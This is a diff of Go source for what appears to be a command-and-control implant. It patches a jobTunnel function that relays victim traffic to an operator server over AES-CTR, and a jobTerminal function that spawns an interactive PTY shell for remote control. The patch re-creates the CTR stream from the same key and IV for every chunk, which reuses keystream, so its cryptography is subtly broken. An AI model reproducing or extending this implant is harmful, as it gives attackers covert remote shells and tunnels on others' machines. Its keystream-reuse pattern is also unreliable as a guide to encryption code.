@@ -1120,13 +1120,13 @@ func jobTunnel(paramsData []byte) {
 			return
 		}
 
+		// Stateless Encryption for Tunnel
 		encCipher, _ := aes.NewCipher(tunKey)
-		encStream := cipher.NewCTR(encCipher, tunIv)
-		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
-
 		decCipher, _ := aes.NewCipher(tunKey)
-		decStream := cipher.NewCTR(decCipher, tunIv)
-		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
+		
+		// Fallback for TCP
+		streamWriter := &cipher.StreamWriter{S: cipher.NewCTR(encCipher, tunIv), W: srvConn}
+		streamReader := &cipher.StreamReader{S: cipher.NewCTR(decCipher, tunIv), R: srvConn}
 
 		ctx, cancel := context.WithCancel(context.Background())
 		TUNNELS.Store(params.ChannelId, cancel)
@@ -1153,10 +1153,14 @@ func jobTunnel(paramsData []byte) {
 						break
 					}
 					if len(encData) > 0 {
+						// Stateless Decrypt
 						decData := make([]byte, len(encData))
-						decStream.XORKeyStream(decData, encData)
+						localDecStream := cipher.NewCTR(decCipher, tunIv)
+						localDecStream.XORKeyStream(decData, encData)
+
 						_, err = clientConn.Write(decData)
 						if err != nil {
+							fmt.Printf("[DEBUG] Tunnel Client Write Error: %v\n", err)
 							break
 						}
 					}
@@ -1176,7 +1180,9 @@ func jobTunnel(paramsData []byte) {
 					n, err := clientConn.Read(buf)
 					if n > 0 {
 						encData := make([]byte, n)
-						encStream.XORKeyStream(encData, buf[:n])
+						// Stateless Encrypt
+						localEncStream := cipher.NewCTR(encCipher, tunIv)
+						localEncStream.XORKeyStream(encData, buf[:n])
 
 						tunPack := utils.TunnelPack{Id: uint(AgentId), ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: true, Data: encData}
 						tpData, _ := msgpack.Marshal(tunPack)
@@ -1193,6 +1199,9 @@ func jobTunnel(paramsData []byte) {
 						}
 					}
 					if err != nil {
+						if err != io.EOF {
+							fmt.Printf("[DEBUG] Tunnel Client Read Error: %v\n", err)
+						}
 						break
 					}
 				}
@@ -1224,7 +1233,11 @@ func jobTerminal(paramsData []byte) {
 		active := true
 		status := ""
 
-		process := exec.Command(params.Program)
+		args := []string{}
+		if strings.HasSuffix(params.Program, "sh") {
+			args = append(args, "-i")
+		}
+		process := exec.Command(params.Program, args...)
 		ptyProc, err := functions.StartPtyCommand(process, uint16(params.Width), uint16(params.Height))
 		if err != nil {
 			active = false
